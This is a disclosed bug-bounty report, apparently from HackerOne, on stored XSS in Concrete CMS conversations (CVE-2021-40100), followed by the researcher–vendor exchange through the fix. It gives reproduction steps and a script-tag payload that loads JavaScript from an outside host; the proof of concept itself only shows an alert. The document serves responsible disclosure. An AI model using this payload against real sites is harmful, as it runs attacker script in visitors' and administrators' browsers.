title: Stored XSS in Conversations (both client and admin) when Active Conversation Editor is set to "Rich Text"

profile.name: Concrete CMS
profile.about: A simple and powerful content management system.

vulnerability_information:
Hi concrete5 Team,

**Summary**

I've identified Stored XSS vulnerability in  concrete5 **Conversations** module, when Active Conversation Editor is set to "Rich Text". An attacker is able to input malicious JavaScript, which is run in both client (agains any site visitor) as well as against any user logged into admin panel and visiting Conversations->Messages screen.

Severity: **External Attack Vector**; Core CMS
 
Core Version - 8.5.2a1
Version Installed - 8.5.2a1
Database Version - 20190520171430

commit `aeaa924977ee87220b7f2d2dadc25d5a24b9e2a1`

There are also some crayons here and there :)

**Steps to reproduce**

(All steps were made in concrete5 with default Elemental theme)

- make sure that *Active Conversation Editor* in System & Settings->Conversations->Settings is set to *Rich Text*

- go to any blog entry which allows to add a comment

- in rich text editor, make sure you click "Source" button first. That will save HTML with `<script>` tag and JavaScript payload "as-is" in database

- put following payload in comment field:

`<script src="http://bl4de.tech/poc.js"></script>`

{F510304}

- post comment

- you will immediately notice the payload is executed

- you can verify this is Stored XSS opening the page in any other browser, as an anonymous or logged in user:

Chrome

{F510307}

Firefox

{F510308}

Also, the payload is not visible. Below is the difference in comment when `Source` button was on and off (with the same payload as provided above):

{F510305}


- verify that payload **is also executed in administration panel** by going to Conversations->Messages screen:


{F510306}

**Impact**

An attacker is able to execute malicious JavaScript against any user, in both client and backend of the concrete5 application.


**Testing environment**

- concrete 8.5.2a1, installed locally from branch `develop`
- PHP/7.1.23 (macOS)
- Apache/2.4.34 (macOS)
- MySQL Community Server 8.0.16 for macOS 10.14
- Chromium 77.0.3826.0
- Google Chrome 74.0.3729.169
- Firefox 67.0.2

Content of `http://bl4de.tech/poc.js` used in PoC as payload:

```
'use strict'
const msg = 'This file is loaded from bl4de.tech domain and executed in context of ' + document.domain;
console.log(msg)
window['alert'](msg)
```



Best Regards,

Rafal 'bl4de' Janicki

## Impact

An attacker is able to execute malicious JavaScript against any user, in both client and backend of application.

activities.message: Thanks for this report, we'll take a look at possible remedies and let you know!

Hi @korvin ,

Great, let me know if you will need any further information - feel free to ping me here or on Slack :)

bl4de

Hi @korvin,

Any update on this?

Cheers,

bl4de

Can anyone close this as Resolved or something?

After 2 years I think this issue is no longer valid.

Cheers,

bl4de
Hello bl4de - I'll track this down internally. Thanks so much for this report. ~Lisa

Hi @lisanicholson ,

Thank you for getting back to me.

Does "track internally" means concrete5 program will no longer be active on HackerOne?

Thank you and stay safe!

Regards,

Rafal

Hi Rafal, Absolutely the concrete5 (now Concrete CMS) program will continue to be active, in fact MORE active, on HackerOne! Sorry for the confusion, I just meant that I will be tracking down if this vulnerability is still valid, and if yes, shepherding its remediation with the PortlandLabs engineers and the Concrete CMS community members on the project's security team.  Regards ~Lisa

Hi @lisanicholson ,

Good to hear that program is going to be active, I really enjoyed hunting for vulnerabilities in concrete5.
Out of curiosity, I will also check if I am able to reproduce this issue in the latest version ;)

Cheers,

Rafal
That would be really helpful, Rafal!

Hi @lisanicholson,

I can confirm the vulnerability is **fully reproducible** in the latest 8.5.5 release.

When Conversation editor is set to `Rich Text`, any JavaScript code inserted into blog comment is executed on the website as well as in the admin panel in `Conversations` section:

Comment with malicious `<script>` tag:

{F1383526}


JavaScript executed in the client:

{F1383525}

JavaScript executed in admin panel:

{F1383527}


Let me know if you need more information.

Cheers,

Rafal
Thanks so very much for verifying! We'll get working on this since it has already waited around WAY too long. Any suggestions for a solution?

Hi @lisaciso,

Let me think about it and play with the code a little and I'll get back to you when I'll figure out something.

Cheers,

Rafal
Thanks Rafal, This is very helpful. I'm pushing to get this fixed in the next release. ~Lisa

@bl4de 

Hello Rafal, 

We greatly appreciate the work that you put into this report! A fix for the vulnerability you reported has been put into Concrete CMS release candidate 9.0.0RC1. This release is a test release for the community to debug prior to a full release in the fall. You are more than welcome to download the release candidate to confirm the fix does indeed remediate the vulnerability you reported.

I will be obtaining a CVE for this vulnerability that will be disclosed upon the full version 9 release. We respectfully request that you refrain from publicizing the vulnerability or the CVE before then. We will communicate with you at that time to give you permission to publicize it.

We value reporters like yourself helping us to make the project more secure!

Sincerely
~Lisa

Hi @lisaciso,

Thank you for the update! 

>  A fix for the vulnerability you reported has been put into Concrete CMS release candidate 9.0.0RC1. This release is a test release for the community to debug prior to a full release in the fall

I will download and test 9.0RC before it's going to be released - let's see if I will find anything else ;)

Stay safe and take care!

Cheers,

Rafal

Hi @bl4de 

Thanks again for all the work you did on reporting this vulnerability to us.
A fix for this vulnerability you reported has been merged into these release candidates:
9.0.0RC3https://www.concretecms.com/download_file/8c1f8bf8-6e0f-4730-bfb6-649c8213f283
8.5.6RC1https://www.concretecms.com/download_file/2e714705-d861-484f-9e33-2b7ecfd7e585

It would be greatly appreciated if you could verify that we have indeed fixed the issue.

I will be attaching a CVE to this HackerOne report. Respectfully, please do not disclose the CVE until we give you the "ok" to do so. Thanks for understanding!
~Lisa

Hi @lisaciso,

Thank you for keeping me updated, I really appreciate that :)

I can confirm that issue **is no longer reproducible on 8.5.6RC1**, however on **9.0.0RC3 I get an error that CKEDITOR is not defined** and I can't verify (but I guess it's also not reproducible if the same patch was applied):

{F1420039}

(tested on: macOS 11.5.2, Chrome 92.0.4515.131 arm64)

Cheers,

Rafal

@bl4de 

Hi Rafal, You are correct that the same fix was put into both release candidates. However, thanks for letting us know that CKEDITOR is throwing an error in 9RC3. 

Thanks also for being such an active member of the open source community! 

~Lisa

@bl4de MITRE has been informed to release the CVE. Concrete CMS 8.5.6 has been publicly released https://documentation.concretecms.org/developers/introduction/version-history/856-release-notes. You are welcome to disclose.

Hi @lisaciso ,

Thank you very much for the update!

Stay safe,

bl4de

NIST scored this as 5.4 CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N 
https://nvd.nist.gov/vuln/detail/CVE-2021-40100
